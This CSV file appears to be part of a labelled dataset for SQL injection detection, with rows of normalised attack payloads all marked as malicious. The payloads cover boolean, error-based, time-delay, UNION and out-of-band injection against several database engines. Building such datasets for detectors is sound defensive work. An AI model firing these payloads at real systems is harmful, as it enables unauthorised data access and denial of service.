row_index,payload_norm,label,sqli_type_hint
2940,-3496' ) ) or 9323 = 9323#,1,
2941,1%' ) ) ) and 3916 = 6327--,1,
2942,"1"" and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ""exgr"" like ""exgr",1,
2943,"-1376%"" ) ) ) or 3458 = 9503 and ( ( ( ""%"" = """,1,
2944,"1%"" and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,
2945,"1' ) ) ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( ( 'wzdo' = 'wzdo",1,
2946,1' ) ) as vdhw where 8858 = 8858 order by 1#,1,
2947,1 ) where 8232 = 8232 and ( 3020 = 3020 ) *6703--,1,
2948,"1"" ) where 6018 = 6018 and 7533 = 7533--",1,
2949,"1 ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( 9112 = 9112",1,
2950,-5555 ) ) as ldte where 4583 = 4583 order by 1#,1,
2951,-1886' where 5518 = 5518 or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --,1,
2952,"1%"" ) ) ) and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,
2953,"1' ) ) as atpy where 9020 = 9020 or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,
2954,"1%' ) and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,
2955,1' union all select null#,1,
2956,"1' and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and 'hzav' = 'hzav",1,
2957,1'|| ( select 'zccb' from dual where 8911 = 8911,1,
2958,"-3137'|| ( select 'btif' where 1718 = 1718 union all select 1718,1718,1718,1718,1718,1718,1718,1718,1718#",1,
2959,"-3819' ) ) ) union all select 9014,9014,9014,9014,9014,9014--",1,
2960,"1%' ) ) or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,
2961,"1' where 4149 = 4149 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,
2962,"1 ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) )",1,
2963,1 where 2382 = 2382,1,
2964,"-2276"" ) ) as qwow where 2321 = 2321 or 3534 = 2971--",1,
2965,select ( case when ( 7997 = 1543 ) then 7997 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,1,
2966,"1"" ) where 5129 = 5129 order by 1--",1,
2967,1 where 9404 = 9404,1,
2968,1' ) where 7252 = 7252,1,
2969,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( 'fnon' like 'fnon",1,
